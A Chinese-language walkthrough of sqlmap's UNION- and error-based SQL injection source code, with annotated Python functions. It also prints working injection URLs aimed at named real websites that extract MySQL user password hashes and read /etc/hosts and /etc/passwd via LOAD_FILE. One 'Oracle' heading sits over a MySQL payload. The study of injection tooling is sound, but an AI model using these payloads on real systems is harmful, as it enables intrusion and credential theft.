<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=9136 AND (SELECT 9066 FROM(SELECT COUNT(*),CONCAT(CHAR(58,106,108,98,58),(MID((IFNULL(CAST(VERSION() AS CHAR),CHAR(32))),1,50)),CHAR(58,108,112,108,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)<br></code></pre></td></tr></table></figure>

<ul>
<li>CONCAT 字符串连接</li>
<li>IFNULL 判断是否为空</li>
<li>CAST 将字符串转化为不同的字符集</li>
<li>MID  字符串截取 MID(string, position[, length])</li>
<li>CHAR(58,106,108,98,58)  &#x3D;&gt; :bjl:</li>
<li>CHAR(58,108,112,108,58) &#x3D;&gt; :lpl:</li>
</ul>
<p>利用的Mysql的一个特性，<a target="_blank" rel="noopener" href="http://bugs.mysql.com/bug.php?id=32249">http://bugs.mysql.com/bug.php?id=32249</a></p>
<h4 id="Microsoft-SQL-Server-Sybase-AND-error-based-WHERE-or-HAVING-clause"><a href="#Microsoft-SQL-Server-Sybase-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause"></a>Microsoft SQL Server&#x2F;Sybase AND error-based - WHERE or HAVING clause</h4><p>这部分没有记录。</p>
<h4 id="PostgreSQL-AND-error-based-WHERE-or-HAVING-clause"><a href="#PostgreSQL-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="PostgreSQL AND error-based - WHERE or HAVING clause"></a>PostgreSQL AND error-based - WHERE or HAVING clause</h4><p>这部分没有记录。</p>
<h4 id="Oracle-AND-error-based-WHERE-or-HAVING-clause-XMLType"><a href="#Oracle-AND-error-based-WHERE-or-HAVING-clause-XMLType" class="headerlink" title="Oracle AND error-based - WHERE or HAVING clause (XMLType)"></a>Oracle AND error-based - WHERE or HAVING clause (XMLType)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=9136 AND (SELECT 6531 FROM(SELECT COUNT(*),CONCAT(CHAR(58,121,121,98,58),(SELECT MID(IFNULL(CAST(concat(user,char(58),password) AS CHAR), CHAR(32)),1,50) FROM mysql.user LIMIT 0,1),CHAR(58,106,116,113,58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)<br></code></pre></td></tr></table></figure>

<h3 id="unionTest-函数，UNION-query-inband-SQL-injection"><a href="#unionTest-函数，UNION-query-inband-SQL-injection" class="headerlink" title="unionTest() 函数，UNION query (inband) SQL injection"></a>unionTest() 函数，UNION query (inband) SQL injection</h3><p>(1) 设置union 使用的字符和注释<br>(2) 判断union查询的列数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forgeInbandQuery</span>(<span class="hljs-params">self, query, position, count, comment, prefix, suffix, char, multipleUnions=<span class="hljs-literal">None</span>, limited=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Take in input an query (pseudo query) string and return its</span><br><span class="hljs-string">    processed UNION ALL SELECT query.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Examples:</span><br><span class="hljs-string"></span><br><span class="hljs-string">    MySQL input:  CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)) FROM mysql.user</span><br><span class="hljs-string">    MySQL output:  UNION ALL SELECT NULL, CONCAT(CHAR(120,121,75,102,103,89),IFNULL(CAST(user AS CHAR(10000)), CHAR(32)),CHAR(106,98,66,73,109,81),IFNULL(CAST(password AS CHAR(10000)), CHAR(32)),CHAR(105,73,99,89,69,74)), NULL FROM mysql.user-- AND 7488=7488</span><br><span class="hljs-string"></span><br><span class="hljs-string">    PostgreSQL input:  (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)) FROM pg_shadow</span><br><span class="hljs-string">    PostgreSQL output:  UNION ALL SELECT NULL, (CHR(116)||CHR(111)||CHR(81)||CHR(80)||CHR(103)||CHR(70))||COALESCE(CAST(usename AS CHARACTER(10000)), (CHR(32)))||(CHR(106)||CHR(78)||CHR(121)||CHR(111)||CHR(84)||CHR(85))||COALESCE(CAST(passwd AS CHARACTER(10000)), (CHR(32)))||(CHR(108)||CHR(85)||CHR(122)||CHR(85)||CHR(108)||CHR(118)), NULL FROM pg_shadow-- AND 7133=713</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Oracle input:  (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))</span><br><span class="hljs-string">    Oracle output:  UNION ALL SELECT NULL, (CHR(109)||CHR(89)||CHR(75)||CHR(109)||CHR(85)||CHR(68))||NVL(CAST(COLUMN_NAME AS VARCHAR(4000)), (CHR(32)))||(CHR(108)||CHR(110)||CHR(89)||CHR(69)||CHR(122)||CHR(90))||NVL(CAST(DATA_TYPE AS VARCHAR(4000)), (CHR(32)))||(CHR(89)||CHR(80)||CHR(98)||CHR(77)||CHR(80)||CHR(121)), NULL FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83))-- AND 6738=6738</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Microsoft SQL Server input:  (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)) FROM master..sysxlogins</span><br><span class="hljs-string">    Microsoft SQL Server output:  UNION ALL SELECT NULL, (CHAR(74)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(116)+CHAR(108))+ISNULL(CAST(name AS VARCHAR(8000)), (CHAR(32)))+(CHAR(89)+CHAR(87)+CHAR(116)+CHAR(100)+CHAR(106)+CHAR(74))+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS VARCHAR(8000)), (CHAR(32)))+(CHAR(71)+CHAR(74)+CHAR(68)+CHAR(66)+CHAR(85)+CHAR(106)), NULL FROM master..sysxlogins-- AND 3254=3254</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @param query: it is a processed query string unescaped to be</span><br><span class="hljs-string">    forged within an UNION ALL SELECT statement</span><br><span class="hljs-string">    @type query: C&#123;str&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @param position: it is the NULL position where it is possible</span><br><span class="hljs-string">    to inject the query</span><br><span class="hljs-string">    @type position: C&#123;int&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    @return: UNION ALL SELECT query string forged</span><br><span class="hljs-string">    @rtype: C&#123;str&#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> query.startswith(<span class="hljs-string">&quot;SELECT &quot;</span>):<br>        query = query[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;SELECT &quot;</span>):]<br><br>    inbandQuery = <span class="hljs-variable language_">self</span>.prefixQuery(<span class="hljs-string">&quot;UNION ALL SELECT &quot;</span>, prefix=prefix)<br><br>    <span class="hljs-keyword">if</span> limited:<br>        inbandQuery += <span class="hljs-string">&quot;,&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: char <span class="hljs-keyword">if</span> x != position <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;(SELECT %s)&#x27;</span> % query, xrange(<span class="hljs-number">0</span>, count)))<br>        inbandQuery += FROM_TABLE.get(Backend.getIdentifiedDbms(), <span class="hljs-string">&quot;&quot;</span>)<br>        inbandQuery = <span class="hljs-variable language_">self</span>.suffixQuery(inbandQuery, comment, suffix)<br><br>        <span class="hljs-keyword">return</span> inbandQuery<br><br>    topNumRegex = re.search(<span class="hljs-string">&quot;\ATOP\s+([\d]+)\s+&quot;</span>, query, re.I)<br>    <span class="hljs-keyword">if</span> topNumRegex:<br>        topNum = topNumRegex.group(<span class="hljs-number">1</span>)<br>        query = query[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;TOP %s &quot;</span> % topNum):]<br>        inbandQuery += <span class="hljs-string">&quot;TOP %s &quot;</span> % topNum<br><br>    intoRegExp = re.search(<span class="hljs-string">&quot;(\s+INTO (DUMP|OUT)FILE\s+\&#x27;(.+?)\&#x27;)&quot;</span>, query, re.I)<br><br>    <span class="hljs-keyword">if</span> intoRegExp:<br>        intoRegExp = intoRegExp.group(<span class="hljs-number">1</span>)<br>        query = query[:query.index(intoRegExp)]<br><br>    <span class="hljs-keyword">if</span> Backend.getIdentifiedDbms() <span class="hljs-keyword">in</span> FROM_TABLE <span class="hljs-keyword">and</span> inbandQuery.endswith(FROM_TABLE[Backend.getIdentifiedDbms()]):<br>        inbandQuery = inbandQuery[:-<span class="hljs-built_in">len</span>(FROM_TABLE[Backend.getIdentifiedDbms()])]<br><br>    <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, count):<br>        <span class="hljs-keyword">if</span> element &gt; <span class="hljs-number">0</span>:<br>            inbandQuery += <span class="hljs-string">&quot;, &quot;</span><br><br>        <span class="hljs-keyword">if</span> element == position:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; FROM &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;WHEN use&quot;</span> <span class="hljs-keyword">in</span> query)) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;EXISTS(&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> query.startswith(<span class="hljs-string">&quot;SELECT &quot;</span>):<br>                conditionIndex = query.index(<span class="hljs-string">&quot; FROM &quot;</span>)<br>                inbandQuery += query[:conditionIndex]<br>            <span class="hljs-keyword">else</span>:<br>                inbandQuery += query<br>        <span class="hljs-keyword">else</span>:<br>            inbandQuery += char<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; FROM &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;WHEN use&quot;</span> <span class="hljs-keyword">in</span> query)) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;EXISTS(&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> query <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> query.startswith(<span class="hljs-string">&quot;SELECT &quot;</span>):<br>        conditionIndex = query.index(<span class="hljs-string">&quot; FROM &quot;</span>)<br>        inbandQuery += query[conditionIndex:]<br><br>    <span class="hljs-keyword">if</span> Backend.getIdentifiedDbms() <span class="hljs-keyword">in</span> FROM_TABLE:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot; FROM &quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> inbandQuery <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;(CASE &quot;</span> <span class="hljs-keyword">in</span> inbandQuery <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;(IIF&quot;</span> <span class="hljs-keyword">in</span> inbandQuery:<br>            inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()]<br><br>    <span class="hljs-keyword">if</span> intoRegExp:<br>        inbandQuery += intoRegExp<br><br>    <span class="hljs-keyword">if</span> multipleUnions:<br>        inbandQuery += <span class="hljs-string">&quot; UNION ALL SELECT &quot;</span><br><br>        <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> xrange(count):<br>            <span class="hljs-keyword">if</span> element &gt; <span class="hljs-number">0</span>:<br>                inbandQuery += <span class="hljs-string">&quot;, &quot;</span><br><br>            <span class="hljs-keyword">if</span> element == position:<br>                inbandQuery += multipleUnions<br>            <span class="hljs-keyword">else</span>:<br>                inbandQuery += char<br><br>        <span class="hljs-keyword">if</span> Backend.getIdentifiedDbms() <span class="hljs-keyword">in</span> FROM_TABLE:<br>            inbandQuery += FROM_TABLE[Backend.getIdentifiedDbms()]<br><br>    inbandQuery = <span class="hljs-variable language_">self</span>.suffixQuery(inbandQuery, comment, suffix)<br><br>    <span class="hljs-keyword">return</span> inbandQuery<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__findUnionCharCount</span>(<span class="hljs-params">comment, place, parameter, value, prefix, suffix, where=PAYLOAD.WHERE.ORIGINAL</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Finds number of columns affected by UNION based injection</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    retVal = <span class="hljs-literal">None</span><br><br>    pushValue(kb.errorIsNone)<br>    items, ratios = [], []<br>    kb.errorIsNone = <span class="hljs-literal">False</span><br>    lowerCount, upperCount = conf.uColsStart, conf.uColsStop<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(upperCount - lowerCount) &lt; MIN_UNION_RESPONSES: <span class="hljs-comment"># MIN_UNION_RESPONSES = 5</span><br>        upperCount = lowerCount + MIN_UNION_RESPONSES<br><br>    min_, max_ = MAX_RATIO, MIN_RATIO <span class="hljs-comment"># MAX_RATIO = 1.0, MIN_RATIO = 0.0</span><br><br>    <span class="hljs-keyword">for</span> count <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lowerCount, upperCount+<span class="hljs-number">1</span>):<br>        query = agent.forgeInbandQuery(<span class="hljs-string">&#x27;&#x27;</span>, -<span class="hljs-number">1</span>, count, comment, prefix, suffix, conf.uChar)<br>        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)<br>        page, _ = Request.queryPage(payload, place=place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)<br>        ratio = comparison(page, <span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> MIN_RATIO<br>        ratios.append(ratio)<br>        min_, max_ = <span class="hljs-built_in">min</span>(min_, ratio), <span class="hljs-built_in">max</span>(max_, ratio)<br>        items.append((count, ratio))<br><br>    ratios.pop(ratios.index(min_)) <span class="hljs-comment"># pop the min</span><br>    ratios.pop(ratios.index(max_)) <span class="hljs-comment"># pop the max</span><br> <br>    deviation = stdev(ratios) <span class="hljs-comment"># 计算标准偏差</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(max_ - min_) &lt; MIN_STATISTICAL_RANGE: <span class="hljs-comment"># MIN_STATISTICAL_RANGE = 0.01</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># UNION_STDEV_COEFF = 7</span><br>    lower, upper = average(ratios) - UNION_STDEV_COEFF * deviation, average(ratios) + UNION_STDEV_COEFF * deviation<br>    minItem, maxItem = <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item[<span class="hljs-number">1</span>] == min_:<br>            minItem = item<br>        <span class="hljs-keyword">elif</span> item[<span class="hljs-number">1</span>] == max_:<br>            maxItem = item<br><br>    <span class="hljs-keyword">if</span> min_ &lt; lower:<br>        retVal = minItem[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">if</span> max_ &gt; upper:<br>        <span class="hljs-keyword">if</span> retVal <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">abs</span>(max_ - upper) &gt; <span class="hljs-built_in">abs</span>(min_ - lower):<br>            retVal = maxItem[<span class="hljs-number">0</span>]<br><br>    kb.errorIsNone = popValue()<br><br>    <span class="hljs-keyword">if</span> retVal:<br>        infoMsg = <span class="hljs-string">&quot;target url appears to be UNION injectable with %d columns&quot;</span> % retVal<br>        logger.info(infoMsg)<br><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure>

<p>(3) 根据不同的数据库加上必要的from 表名<br>(4) 再次验证</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__unionPosition</span>(<span class="hljs-params">comment, place, parameter, value, prefix, suffix, count, where=PAYLOAD.WHERE.ORIGINAL</span>):<br>    validPayload = <span class="hljs-literal">None</span><br>    vector = <span class="hljs-literal">None</span><br><br>    positions = <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, count)<br><br>    <span class="hljs-comment"># Unbiased approach for searching appropriate usable column</span><br>    <span class="hljs-comment"># list 中元素乱序</span><br>    random.shuffle(positions)<br><br>    <span class="hljs-comment"># For each column of the table (# of NULL) perform a request using</span><br>    <span class="hljs-comment"># the UNION ALL SELECT statement to test it the target url is</span><br>    <span class="hljs-comment"># affected by an exploitable inband SQL injection vulnerability</span><br>    <span class="hljs-comment"># 查找可以显示的列</span><br>    <span class="hljs-keyword">for</span> position <span class="hljs-keyword">in</span> positions:<br>        <span class="hljs-comment"># Prepare expression with delimiters</span><br>        randQuery = randomStr(UNION_MIN_RESPONSE_CHARS) <span class="hljs-comment">#UNION_MIN_RESPONSE_CHARS = 10</span><br>        <span class="hljs-comment"># 构造随机字符串做标记</span><br>        phrase = <span class="hljs-string">&quot;%s%s%s&quot;</span>.lower() % (kb.misc.start, randQuery, kb.misc.stop) <br>        randQueryProcessed = agent.concatQuery(<span class="hljs-string">&quot;\&#x27;%s\&#x27;&quot;</span> % randQuery)<br>        <span class="hljs-keyword">import</span> logging<br>        logging.debug(<span class="hljs-string">&#x27;randQueryProcessed: %s&#x27;</span> % randQueryProcessed)<br>        randQueryUnescaped = unescaper.unescape(randQueryProcessed)<br><br>        <span class="hljs-comment"># Forge the inband SQL injection request</span><br>        <span class="hljs-comment"># 构造UNION ALL SELECT 查询</span><br>        query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar)<br>        payload = agent.payload(place=place, parameter=parameter, newValue=query, where=where)<br><br>        <span class="hljs-comment"># Perform the request</span><br>        page, headers = Request.queryPage(payload, place=place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)<br>        <span class="hljs-comment"># 移除反射的内容</span><br>        content = <span class="hljs-string">&quot;%s%s&quot;</span>.lower() % (removeReflectiveValues(page, payload) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>, \<br>            removeReflectiveValues(listToStrValue(headers.headers <span class="hljs-keyword">if</span> headers <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>), \<br>            payload, <span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> content <span class="hljs-keyword">and</span> phrase <span class="hljs-keyword">in</span> content:<br>            validPayload = payload<br>            vector = (position, count, comment, prefix, suffix, conf.uChar, where)<br><br>            <span class="hljs-keyword">if</span> where == PAYLOAD.WHERE.ORIGINAL:<br>                <span class="hljs-comment"># Prepare expression with delimiters</span><br>                randQuery2 = randomStr(UNION_MIN_RESPONSE_CHARS) <span class="hljs-comment"># UNION_MIN_RESPONSE_CHARS = 10</span><br>                phrase2 = <span class="hljs-string">&quot;%s%s%s&quot;</span>.lower() % (kb.misc.start, randQuery2, kb.misc.stop)<br>                randQueryProcessed2 = agent.concatQuery(<span class="hljs-string">&quot;\&#x27;%s\&#x27;&quot;</span> % randQuery2)<br>                randQueryUnescaped2 = unescaper.unescape(randQueryProcessed2)<br><br>                <span class="hljs-comment"># Confirm that it is a full inband SQL injection</span><br>                query = agent.forgeInbandQuery(randQueryUnescaped, position, count, comment, prefix, suffix, conf.uChar, multipleUnions=randQueryUnescaped2)<br>                payload = agent.payload(place=place, parameter=parameter, newValue=query, where=PAYLOAD.WHERE.NEGATIVE)<br><br>                <span class="hljs-comment"># Perform the request</span><br>                page, headers = Request.queryPage(payload, place=place, content=<span class="hljs-literal">True</span>, raise404=<span class="hljs-literal">False</span>)<br>                content = <span class="hljs-string">&quot;%s%s&quot;</span>.lower() % (page <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>, listToStrValue(headers.headers <span class="hljs-keyword">if</span> headers <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br><br>                <span class="hljs-keyword">if</span> content <span class="hljs-keyword">and</span> ((phrase <span class="hljs-keyword">in</span> content <span class="hljs-keyword">and</span> phrase2 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> content) <span class="hljs-keyword">or</span> (phrase <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> content <span class="hljs-keyword">and</span> phrase2 <span class="hljs-keyword">in</span> content)):<br>                    vector = (position, count, comment, prefix, suffix, conf.uChar, PAYLOAD.WHERE.NEGATIVE)<br><br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">return</span> validPayload, vector<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://ipv6.tsinghua.edu.cn/end.php?ID=-3255%20UNION%20ALL%20SELECT%20NULL,%20CONCAT%28CHAR%2858,107,113,117,58%29,IFNULL%28CAST%28LOAD_FILE%28CHAR%2847,101,116,99,47,104,111,115,116,115%29%29%20AS%20CHAR%29,CHAR%2832%29%29,CHAR%2858,101,114,112,58%29%29,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL#<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://ipv6.tsinghua.edu.cn/end.php?ID=-8675%20UNION%20ALL%20SELECT%20NULL,%20CONCAT%28CHAR%2858,108,100,107,58%29,IFNULL%28CAST%28LOAD_FILE%28CHAR%2847,101,116,99,47,112,97,115,115,119,100%29%29%20AS%20CHAR%29,CHAR%2832%29%29,CHAR%2858,111,121,105,58%29%29,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL#<br></code></pre></td></tr></table></figure>

<h3 id="基于响应时间-time-based-blind-and-stacked-queries-SQL-injections"><a href="#基于响应时间-time-based-blind-and-stacked-queries-SQL-injections" class="headerlink" title="基于响应时间, time-based blind and stacked queries SQL injections"></a>基于响应时间, time-based blind and stacked queries SQL injections</h3><p>判断是否delay，在 lib&#x2F;core&#x2F;common.py 中wasLastRequestDelayed 实现根据统计结果，sqlmap 注释</p>
